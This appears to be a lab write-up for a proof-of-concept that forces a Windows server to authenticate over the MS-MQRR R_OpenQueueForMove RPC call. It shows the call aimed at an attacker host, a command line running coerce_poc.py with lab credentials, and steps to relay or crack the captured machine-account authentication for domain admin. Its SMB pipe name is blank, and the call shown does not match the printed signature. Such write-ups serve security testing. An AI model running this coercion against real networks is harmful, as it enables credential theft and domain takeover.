# MS-MQRR - Remote call to R_OpenQueueForMove (opnum 11)

## Summary

+ **Protocol**: [[MS-MQRR]: Message Queuing (MSMQ): Queue Manager Remote Read Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/9edbc8fa-02ad-4c79-804f-6bb8f430aac1)

+ **Protocol UUID**: 1a9134dd-7b39-45ba-ad88-44d01ca47f28

+ **Protocol version**: 1.0

+ **SMB Named pipe**: ``

+ **Function name**: [`R_OpenQueueForMove`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/960e383b-d0c9-482f-9617-2507d1dc0487)

+ **Function operation number**: `11`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-MQRR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/9edbc8fa-02ad-4c79-804f-6bb8f430aac1) protocol (with uuid `1a9134dd-7b39-45ba-ad88-44d01ca47f28` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-MQRR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/9edbc8fa-02ad-4c79-804f-6bb8f430aac1) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-MQRR]: Message Queuing (MSMQ): Queue Manager Remote Read Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/9edbc8fa-02ad-4c79-804f-6bb8f430aac1) and allows to call RPC functions of this protocol. We will then call the remote [`R_OpenQueueForMove`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/960e383b-d0c9-482f-9617-2507d1dc0487) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
R_OpenQueueForMove('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
void R_OpenQueueForMove(
   [in] handle_t hBind,
   [in] QUEUE_FORMAT* pQueueFormat,
   [in] DWORD dwAccess,
   [in] DWORD dwShareMode,
   [in] GUID* pClientId,
   [in] LONG fNonRoutingServer,
   [in] unsigned char Major,
   [in] unsigned char Minor,
   [in] USHORT BuildNumber,
   [in] LONG fWorkgroup,
   [out] ULONGLONG* pMoveContext,
   [out] QUEUE_CONTEXT_HANDLE_SERIALIZE* pphContext
 );
```

## References

+ Documentation of protocol [MS-MQRR]: Message Queuing (MSMQ): Queue Manager Remote Read Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/9edbc8fa-02ad-4c79-804f-6bb8f430aac1

+ Documentation of function `R_OpenQueueForMove`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/960e383b-d0c9-482f-9617-2507d1dc0487